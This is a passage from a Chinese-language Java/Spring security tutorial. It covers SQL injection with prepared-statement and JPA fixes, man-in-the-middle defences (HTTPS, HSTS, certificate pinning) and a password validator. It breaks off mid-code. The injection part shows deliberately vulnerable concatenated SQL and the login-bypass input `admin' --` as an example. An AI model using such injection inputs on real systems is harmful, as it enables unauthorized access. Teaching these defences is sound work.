</span><span id="__span-136-4"><a id="__codelineno-136-4" name="__codelineno-136-4" href="#__codelineno-136-4"></a><span class="n">String</span><span class="w"> </span><span class="n">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;SELECT * FROM users WHERE username=&#39;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span>
</span><span id="__span-136-5"><a id="__codelineno-136-5" name="__codelineno-136-5" href="#__codelineno-136-5"></a><span class="w">             </span><span class="s">&quot;&#39; AND password=&#39;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;&#39;&quot;</span><span class="p">;</span>
</span><span id="__span-136-6"><a id="__codelineno-136-6" name="__codelineno-136-6" href="#__codelineno-136-6"></a>
</span><span id="__span-136-7"><a id="__codelineno-136-7" name="__codelineno-136-7" href="#__codelineno-136-7"></a><span class="c1">// 攻击者输入：</span>
</span><span id="__span-136-8"><a id="__codelineno-136-8" name="__codelineno-136-8" href="#__codelineno-136-8"></a><span class="c1">// username: admin&#39; --</span>
</span><span id="__span-136-9"><a id="__codelineno-136-9" name="__codelineno-136-9" href="#__codelineno-136-9"></a><span class="c1">// password: anything</span>
</span><span id="__span-136-10"><a id="__codelineno-136-10" name="__codelineno-136-10" href="#__codelineno-136-10"></a><span class="c1">// 生成的SQL: SELECT * FROM users WHERE username=&#39;admin&#39; --&#39; AND password=&#39;anything&#39;</span>
</span><span id="__span-136-11"><a id="__codelineno-136-11" name="__codelineno-136-11" href="#__codelineno-136-11"></a><span class="c1">// -- 是注释符，后面的密码验证被注释掉了！</span>
</span></code></pre></div></p>
<p><strong>防护措施：</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1" href="#__codelineno-137-1"></a><span class="cm">/**</span>
</span><span id="__span-137-2"><a id="__codelineno-137-2" name="__codelineno-137-2" href="#__codelineno-137-2"></a><span class="cm"> * 使用预编译语句（Prepared Statement）</span>
</span><span id="__span-137-3"><a id="__codelineno-137-3" name="__codelineno-137-3" href="#__codelineno-137-3"></a><span class="cm"> */</span>
</span><span id="__span-137-4"><a id="__codelineno-137-4" name="__codelineno-137-4" href="#__codelineno-137-4"></a><span class="kd">public</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="nf">findUser</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-137-5"><a id="__codelineno-137-5" name="__codelineno-137-5" href="#__codelineno-137-5"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span><span class="p">;</span>
</span><span id="__span-137-6"><a id="__codelineno-137-6" name="__codelineno-137-6" href="#__codelineno-137-6"></a>
</span><span id="__span-137-7"><a id="__codelineno-137-7" name="__codelineno-137-7" href="#__codelineno-137-7"></a><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dataSource</span><span class="p">.</span><span class="na">getConnection</span><span class="p">();</span>
</span><span id="__span-137-8"><a id="__codelineno-137-8" name="__codelineno-137-8" href="#__codelineno-137-8"></a><span class="w">         </span><span class="n">PreparedStatement</span><span class="w"> </span><span class="n">stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">prepareStatement</span><span class="p">(</span><span class="n">sql</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-137-9"><a id="__codelineno-137-9" name="__codelineno-137-9" href="#__codelineno-137-9"></a>
</span><span id="__span-137-10"><a id="__codelineno-137-10" name="__codelineno-137-10" href="#__codelineno-137-10"></a><span class="w">        </span><span class="n">stmt</span><span class="p">.</span><span class="na">setString</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span><span class="w">  </span><span class="c1">// 参数自动转义</span>
</span><span id="__span-137-11"><a id="__codelineno-137-11" name="__codelineno-137-11" href="#__codelineno-137-11"></a><span class="w">        </span><span class="n">stmt</span><span class="p">.</span><span class="na">setString</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">);</span>
</span><span id="__span-137-12"><a id="__codelineno-137-12" name="__codelineno-137-12" href="#__codelineno-137-12"></a>
</span><span id="__span-137-13"><a id="__codelineno-137-13" name="__codelineno-137-13" href="#__codelineno-137-13"></a><span class="w">        </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stmt</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">();</span>
</span><span id="__span-137-14"><a id="__codelineno-137-14" name="__codelineno-137-14" href="#__codelineno-137-14"></a><span class="w">        </span><span class="c1">// 处理结果</span>
</span><span id="__span-137-15"><a id="__codelineno-137-15" name="__codelineno-137-15" href="#__codelineno-137-15"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-137-16"><a id="__codelineno-137-16" name="__codelineno-137-16" href="#__codelineno-137-16"></a><span class="p">}</span>
</span><span id="__span-137-17"><a id="__codelineno-137-17" name="__codelineno-137-17" href="#__codelineno-137-17"></a>
</span><span id="__span-137-18"><a id="__codelineno-137-18" name="__codelineno-137-18" href="#__codelineno-137-18"></a><span class="cm">/**</span>
</span><span id="__span-137-19"><a id="__codelineno-137-19" name="__codelineno-137-19" href="#__codelineno-137-19"></a><span class="cm"> * 使用ORM框架（JPA/Hibernate）</span>
</span><span id="__span-137-20"><a id="__codelineno-137-20" name="__codelineno-137-20" href="#__codelineno-137-20"></a><span class="cm"> */</span>
</span><span id="__span-137-21"><a id="__codelineno-137-21" name="__codelineno-137-21" href="#__codelineno-137-21"></a><span class="nd">@Repository</span>
</span><span id="__span-137-22"><a id="__codelineno-137-22" name="__codelineno-137-22" href="#__codelineno-137-22"></a><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">UserRepository</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">JpaRepository</span><span class="o">&lt;</span><span class="n">User</span><span class="p">,</span><span class="w"> </span><span class="n">Long</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-137-23"><a id="__codelineno-137-23" name="__codelineno-137-23" href="#__codelineno-137-23"></a><span class="w">    </span><span class="c1">// 自动使用参数化查询</span>
</span><span id="__span-137-24"><a id="__codelineno-137-24" name="__codelineno-137-24" href="#__codelineno-137-24"></a><span class="w">    </span><span class="n">User</span><span class="w"> </span><span class="nf">findByUsernameAndPassword</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">);</span>
</span><span id="__span-137-25"><a id="__codelineno-137-25" name="__codelineno-137-25" href="#__codelineno-137-25"></a>
</span><span id="__span-137-26"><a id="__codelineno-137-26" name="__codelineno-137-26" href="#__codelineno-137-26"></a><span class="w">    </span><span class="c1">// 或使用JPQL</span>
</span><span id="__span-137-27"><a id="__codelineno-137-27" name="__codelineno-137-27" href="#__codelineno-137-27"></a><span class="w">    </span><span class="nd">@Query</span><span class="p">(</span><span class="s">&quot;SELECT u FROM User u WHERE u.username = :username AND u.password = :password&quot;</span><span class="p">)</span>
</span><span id="__span-137-28"><a id="__codelineno-137-28" name="__codelineno-137-28" href="#__codelineno-137-28"></a><span class="w">    </span><span class="n">User</span><span class="w"> </span><span class="nf">authenticate</span><span class="p">(</span><span class="nd">@Param</span><span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-137-29"><a id="__codelineno-137-29" name="__codelineno-137-29" href="#__codelineno-137-29"></a><span class="w">                     </span><span class="nd">@Param</span><span class="p">(</span><span class="s">&quot;password&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">);</span>
</span><span id="__span-137-30"><a id="__codelineno-137-30" name="__codelineno-137-30" href="#__codelineno-137-30"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="6-中间人攻击man-in-the-middle-attack">6. 中间人攻击（Man-in-the-Middle Attack）<a class="headerlink" href="#6-中间人攻击man-in-the-middle-attack" title="链接到此标题">&para;</a></h3>
<p><strong>攻击方式：</strong>
- 拦截客户端和服务器之间的通信
- 窃取敏感信息（密码、Token）
- 篡改请求和响应</p>
<p><strong>防护措施：</strong></p>
<ol>
<li>
<p><strong>使用HTTPS</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1" href="#__codelineno-138-1"></a><span class="c1">// Spring Boot强制HTTPS</span>
</span><span id="__span-138-2"><a id="__codelineno-138-2" name="__codelineno-138-2" href="#__codelineno-138-2"></a><span class="nd">@Configuration</span>
</span><span id="__span-138-3"><a id="__codelineno-138-3" name="__codelineno-138-3" href="#__codelineno-138-3"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SecurityConfig</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-138-4"><a id="__codelineno-138-4" name="__codelineno-138-4" href="#__codelineno-138-4"></a><span class="w">    </span><span class="nd">@Bean</span>
</span><span id="__span-138-5"><a id="__codelineno-138-5" name="__codelineno-138-5" href="#__codelineno-138-5"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">SecurityFilterChain</span><span class="w"> </span><span class="nf">filterChain</span><span class="p">(</span><span class="n">HttpSecurity</span><span class="w"> </span><span class="n">http</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-138-6"><a id="__codelineno-138-6" name="__codelineno-138-6" href="#__codelineno-138-6"></a><span class="w">        </span><span class="n">http</span><span class="p">.</span><span class="na">requiresChannel</span><span class="p">()</span>
</span><span id="__span-138-7"><a id="__codelineno-138-7" name="__codelineno-138-7" href="#__codelineno-138-7"></a><span class="w">            </span><span class="p">.</span><span class="na">anyRequest</span><span class="p">()</span>
</span><span id="__span-138-8"><a id="__codelineno-138-8" name="__codelineno-138-8" href="#__codelineno-138-8"></a><span class="w">            </span><span class="p">.</span><span class="na">requiresSecure</span><span class="p">();</span><span class="w"> </span><span class="c1">// 强制HTTPS</span>
</span><span id="__span-138-9"><a id="__codelineno-138-9" name="__codelineno-138-9" href="#__codelineno-138-9"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="na">build</span><span class="p">();</span>
</span><span id="__span-138-10"><a id="__codelineno-138-10" name="__codelineno-138-10" href="#__codelineno-138-10"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-138-11"><a id="__codelineno-138-11" name="__codelineno-138-11" href="#__codelineno-138-11"></a><span class="p">}</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>HTTP Strict Transport Security (HSTS)</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1" href="#__codelineno-139-1"></a><span class="c1">// 告诉浏览器只能通过HTTPS访问</span>
</span><span id="__span-139-2"><a id="__codelineno-139-2" name="__codelineno-139-2" href="#__codelineno-139-2"></a><span class="n">http</span><span class="p">.</span><span class="na">headers</span><span class="p">()</span>
</span><span id="__span-139-3"><a id="__codelineno-139-3" name="__codelineno-139-3" href="#__codelineno-139-3"></a><span class="w">    </span><span class="p">.</span><span class="na">httpStrictTransportSecurity</span><span class="p">()</span>
</span><span id="__span-139-4"><a id="__codelineno-139-4" name="__codelineno-139-4" href="#__codelineno-139-4"></a><span class="w">    </span><span class="p">.</span><span class="na">includeSubDomains</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span>
</span><span id="__span-139-5"><a id="__codelineno-139-5" name="__codelineno-139-5" href="#__codelineno-139-5"></a><span class="w">    </span><span class="p">.</span><span class="na">maxAgeInSeconds</span><span class="p">(</span><span class="mi">31536000</span><span class="p">);</span><span class="w"> </span><span class="c1">// 1年</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>证书固定（Certificate Pinning）</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1" href="#__codelineno-140-1"></a><span class="c1">// 客户端验证服务器证书</span>
</span><span id="__span-140-2"><a id="__codelineno-140-2" name="__codelineno-140-2" href="#__codelineno-140-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CertificatePinning</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-140-3"><a id="__codelineno-140-3" name="__codelineno-140-3" href="#__codelineno-140-3"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">SSLContext</span><span class="w"> </span><span class="nf">createSSLContext</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-140-4"><a id="__codelineno-140-4" name="__codelineno-140-4" href="#__codelineno-140-4"></a><span class="w">        </span><span class="c1">// 加载信任的证书</span>
</span><span id="__span-140-5"><a id="__codelineno-140-5" name="__codelineno-140-5" href="#__codelineno-140-5"></a><span class="w">        </span><span class="n">CertificateFactory</span><span class="w"> </span><span class="n">cf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CertificateFactory</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;X.509&quot;</span><span class="p">);</span>
</span><span id="__span-140-6"><a id="__codelineno-140-6" name="__codelineno-140-6" href="#__codelineno-140-6"></a><span class="w">        </span><span class="n">InputStream</span><span class="w"> </span><span class="n">cert</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getClass</span><span class="p">().</span><span class="na">getResourceAsStream</span><span class="p">(</span><span class="s">&quot;server.crt&quot;</span><span class="p">);</span>
</span><span id="__span-140-7"><a id="__codelineno-140-7" name="__codelineno-140-7" href="#__codelineno-140-7"></a><span class="w">        </span><span class="n">Certificate</span><span class="w"> </span><span class="n">ca</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cf</span><span class="p">.</span><span class="na">generateCertificate</span><span class="p">(</span><span class="n">cert</span><span class="p">);</span>
</span><span id="__span-140-8"><a id="__codelineno-140-8" name="__codelineno-140-8" href="#__codelineno-140-8"></a>
</span><span id="__span-140-9"><a id="__codelineno-140-9" name="__codelineno-140-9" href="#__codelineno-140-9"></a><span class="w">        </span><span class="c1">// 创建包含证书的KeyStore</span>
</span><span id="__span-140-10"><a id="__codelineno-140-10" name="__codelineno-140-10" href="#__codelineno-140-10"></a><span class="w">        </span><span class="n">KeyStore</span><span class="w"> </span><span class="n">keyStore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KeyStore</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="n">KeyStore</span><span class="p">.</span><span class="na">getDefaultType</span><span class="p">());</span>
</span><span id="__span-140-11"><a id="__codelineno-140-11" name="__codelineno-140-11" href="#__codelineno-140-11"></a><span class="w">        </span><span class="n">keyStore</span><span class="p">.</span><span class="na">load</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span>
</span><span id="__span-140-12"><a id="__codelineno-140-12" name="__codelineno-140-12" href="#__codelineno-140-12"></a><span class="w">        </span><span class="n">keyStore</span><span class="p">.</span><span class="na">setCertificateEntry</span><span class="p">(</span><span class="s">&quot;ca&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ca</span><span class="p">);</span>
</span><span id="__span-140-13"><a id="__codelineno-140-13" name="__codelineno-140-13" href="#__codelineno-140-13"></a>
</span><span id="__span-140-14"><a id="__codelineno-140-14" name="__codelineno-140-14" href="#__codelineno-140-14"></a><span class="w">        </span><span class="c1">// 创建TrustManager</span>
</span><span id="__span-140-15"><a id="__codelineno-140-15" name="__codelineno-140-15" href="#__codelineno-140-15"></a><span class="w">        </span><span class="n">TrustManagerFactory</span><span class="w"> </span><span class="n">tmf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TrustManagerFactory</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span>
</span><span id="__span-140-16"><a id="__codelineno-140-16" name="__codelineno-140-16" href="#__codelineno-140-16"></a><span class="w">            </span><span class="n">TrustManagerFactory</span><span class="p">.</span><span class="na">getDefaultAlgorithm</span><span class="p">());</span>
</span><span id="__span-140-17"><a id="__codelineno-140-17" name="__codelineno-140-17" href="#__codelineno-140-17"></a><span class="w">        </span><span class="n">tmf</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="n">keyStore</span><span class="p">);</span>
</span><span id="__span-140-18"><a id="__codelineno-140-18" name="__codelineno-140-18" href="#__codelineno-140-18"></a>
</span><span id="__span-140-19"><a id="__codelineno-140-19" name="__codelineno-140-19" href="#__codelineno-140-19"></a><span class="w">        </span><span class="c1">// 创建SSLContext</span>
</span><span id="__span-140-20"><a id="__codelineno-140-20" name="__codelineno-140-20" href="#__codelineno-140-20"></a><span class="w">        </span><span class="n">SSLContext</span><span class="w"> </span><span class="n">sslContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SSLContext</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;TLS&quot;</span><span class="p">);</span>
</span><span id="__span-140-21"><a id="__codelineno-140-21" name="__codelineno-140-21" href="#__codelineno-140-21"></a><span class="w">        </span><span class="n">sslContext</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">tmf</span><span class="p">.</span><span class="na">getTrustManagers</span><span class="p">(),</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span>
</span><span id="__span-140-22"><a id="__codelineno-140-22" name="__codelineno-140-22" href="#__codelineno-140-22"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">sslContext</span><span class="p">;</span>
</span><span id="__span-140-23"><a id="__codelineno-140-23" name="__codelineno-140-23" href="#__codelineno-140-23"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-140-24"><a id="__codelineno-140-24" name="__codelineno-140-24" href="#__codelineno-140-24"></a><span class="p">}</span>
</span></code></pre></div></p>
</li>
</ol>
<hr />
<h2 id="安全最佳实践">安全最佳实践<a class="headerlink" href="#安全最佳实践" title="链接到此标题">&para;</a></h2>
<h3 id="1-密码安全">1. 密码安全<a class="headerlink" href="#1-密码安全" title="链接到此标题">&para;</a></h3>
<p><strong>强密码策略：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1" href="#__codelineno-141-1"></a><span class="cm">/**</span>
</span><span id="__span-141-2"><a id="__codelineno-141-2" name="__codelineno-141-2" href="#__codelineno-141-2"></a><span class="cm"> * 密码复杂度验证</span>
</span><span id="__span-141-3"><a id="__codelineno-141-3" name="__codelineno-141-3" href="#__codelineno-141-3"></a><span class="cm"> */</span>
</span><span id="__span-141-4"><a id="__codelineno-141-4" name="__codelineno-141-4" href="#__codelineno-141-4"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">PasswordValidator</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-141-5"><a id="__codelineno-141-5" name="__codelineno-141-5" href="#__codelineno-141-5"></a>
</span><span id="__span-141-6"><a id="__codelineno-141-6" name="__codelineno-141-6" href="#__codelineno-141-6"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">MIN_LENGTH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">12</span><span class="p">;</span>
</span><span id="__span-141-7"><a id="__codelineno-141-7" name="__codelineno-141-7" href="#__codelineno-141-7"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Pattern</span><span class="w"> </span><span class="n">UPPERCASE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Pattern</span><span class="p">.</span><span class="na">compile</span><span class="p">(</span><span class="s">&quot;[A-Z]&quot;</span><span class="p">);</span>
</span><span id="__span-141-8"><a id="__codelineno-141-8" name="__codelineno-141-8" href="#__codelineno-141-8"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Pattern</span><span class="w"> </span><span class="n">LOWERCASE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Pattern</span><span class="p">.</span><span class="na">compile</span><span class="p">(</span><span class="s">&quot;[a-z]&quot;</span><span class="p">);</span>
</span><span id="__span-141-9"><a id="__codelineno-141-9" name="__codelineno-141-9" href="#__codelineno-141-9"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Pattern</span><span class="w"> </span><span class="n">DIGIT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Pattern</span><span class="p">.</span><span class="na">compile</span><span class="p">(</span><span class="s">&quot;[0-9]&quot;</span><span class="p">);</span>
</span><span id="__span-141-10"><a id="__codelineno-141-10" name="__codelineno-141-10" href="#__codelineno-141-10"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Pattern</span><span class="w"> </span><span class="n">SPECIAL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Pattern</span><span class="p">.</span><span class="na">compile</span><span class="p">(</span><span class="s">&quot;[!@#$%^&amp;*(),.?\&quot;:{}|&lt;&gt;]&quot;</span><span class="p">);</span>
</span><span id="__span-141-11"><a id="__codelineno-141-11" name="__codelineno-141-11" href="#__codelineno-141-11"></a>
</span><span id="__span-141-12"><a id="__codelineno-141-12" name="__codelineno-141-12" href="#__codelineno-141-12"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">ValidationResult</span><span class="w"> </span><span class="nf">validate</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-141-13"><a id="__codelineno-141-13" name="__codelineno-141-13" href="#__codelineno-141-13"></a><span class="w">        </span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">errors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span>
</span><span id="__span-141-14"><a id="__codelineno-141-14" name="__codelineno-141-14" href="#__codelineno-141-14"></a>
</span><span id="__span-141-15"><a id="__codelineno-141-15" name="__codelineno-141-15" href="#__codelineno-141-15"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">password</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">password</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MIN_LENGTH</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-141-16"><a id="__codelineno-141-16" name="__codelineno-141-16" href="#__codelineno-141-16"></a><span class="w">            </span><span class="n">errors</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;密码长度至少&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">MIN_LENGTH</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;个字符&quot;</span><span class="p">);</span>
</span><span id="__span-141-17"><a id="__codelineno-141-17" name="__codelineno-141-17" href="#__codelineno-141-17"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-141-18"><a id="__codelineno-141-18" name="__codelineno-141-18" href="#__codelineno-141-18"></a>
</span><span id="__span-141-19"><a id="__codelineno-141-19" name="__codelineno-141-19" href="#__codelineno-141-19"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">UPPERCASE</span><span class="p">.</span><span class="na">matcher</span><span class="p">(</span><span class="n">password</span><span class="p">).</span><span class="na">find</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-141-20"><a id="__codelineno-141-20" name="__codelineno-141-20" href="#__codelineno-141-20"></a><span class="w">            </span><span class="n">errors</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;至少包含一个大写字母&quot;</span><span class="p">);</span>
</span><span id="__span-141-21"><a id="__codelineno-141-21" name="__codelineno-141-21" href="#__codelineno-141-21"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-141-22"><a id="__codelineno-141-22" name="__codelineno-141-22" href="#__codelineno-141-22"></a>
</span><span id="__span-141-23"><a id="__codelineno-141-23" name="__codelineno-141-23" href="#__codelineno-141-23"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">LOWERCASE</span><span class="p">.</span><span class="na">matcher</span><span class="p">(</span><span class="n">password</span><span class="p">).</span><span class="na">find</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-141-24"><a id="__codelineno-141-24" name="__codelineno-141-24" href="#__codelineno-141-24"></a><span class="w">            </span><span class="n">errors</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;至少包含一个小写字母&quot;</span><span class="p">);</span>
</span><span id="__span-141-25"><a id="__codelineno-141-25" name="__codelineno-141-25" href="#__codelineno-141-25"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-141-26"><a id="__codelineno-141-26" name="__codelineno-141-26" href="#__codelineno-141-26"></a>
</span><span id="__span-141-27"><a id="__codelineno-141-27" name="__codelineno-141-27" href="#__codelineno-141-27"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DIGIT</span><span class="p">.</span><span class="na">matcher</span><span class="p">(</span><span class="n">password</span><span class="p">).</span><span class="na">find</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-141-28"><a id="__codelineno-141-28" name="__codelineno-141-28" href="#__codelineno-141-28"></a><span class="w">            </span><span class="n">errors</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;至少包含一个数字&quot;</span><span class="p">);</span>
</span><span id="__span-141-29"><a id="__codelineno-141-29" name="__codelineno-141-29" href="#__codelineno-141-29"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-141-30"><a id="__codelineno-141-30" name="__codelineno-141-30" href="#__codelineno-141-30"></a>
</span><span id="__span-141-31"><a id="__codelineno-141-31" name="__codelineno-141-31" href="#__codelineno-141-31"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">SPECIAL</span><span class="p">.</span><span class="na">matcher</span><span class="p">(</span><span class="n">password</span><span class="p">).</span><span class="na">find</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-141-32"><a id="__codelineno-141-32" name="__codelineno-141-32" href="#__codelineno-141-32"></a><span class="w">            </span><span class="n">errors</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;至少包含一个特殊字符&quot;</span><span class="p">);</span>
</span><span id="__span-141-33"><a id="__codelineno-141-33" name="__codelineno-141-33" href="#__codelineno-141-33"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-141-34"><a id="__codelineno-141-34" name="__codelineno-141-34" href="#__codelineno-141-34"></a>
</span><span id="__span-141-35"><a id="__codelineno-141-35" name="__codelineno-141-35" href="#__codelineno-141-35"></a><span class="w">        </span><span class="c1">// 检查常见弱密码</span>
</span><span id="__span-141-36"><a id="__codelineno-141-36" name="__codelineno-141-36" href="#__codelineno-141-36"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isCommonPassword</span><span class="p">(</span><span class="n">password</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-141-37"><a id="__codelineno-141-37" name="__codelineno-141-37" href="#__codelineno-141-37"></a><span class="w">            </span><span class="n">errors</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;密码过于常见，请使用更强的密码&quot;</span><span class="p">);</span>
</span><span id="__span-141-38"><a id="__codelineno-141-38" name="__codelineno-141-38" href="#__codelineno-141-38"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-141-39"><a id="__codelineno-141-39" name="__codelineno-141-39" href="#__codelineno-141-39"></a>
